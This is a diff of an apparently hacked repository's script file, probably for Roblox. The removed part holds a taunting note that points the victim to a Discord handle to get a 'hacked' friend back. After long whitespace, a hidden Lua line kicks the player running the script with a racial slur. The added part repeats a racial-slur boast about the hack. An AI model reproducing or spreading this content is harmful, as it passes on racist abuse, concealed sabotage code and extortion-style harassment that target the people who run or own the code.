@@ -1,38 +1,29 @@
--- Your friend was hacked idiot. Thank's for sharing your github repository with him! Want him back? DM: 0un0 on discord.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                
-                
-                
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                game:GetService("Players").LocalPlayer:Kick("dumbass nigger")
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
+# DUMBASS NIGGA GOT HACKED 0UN0 ON TOP
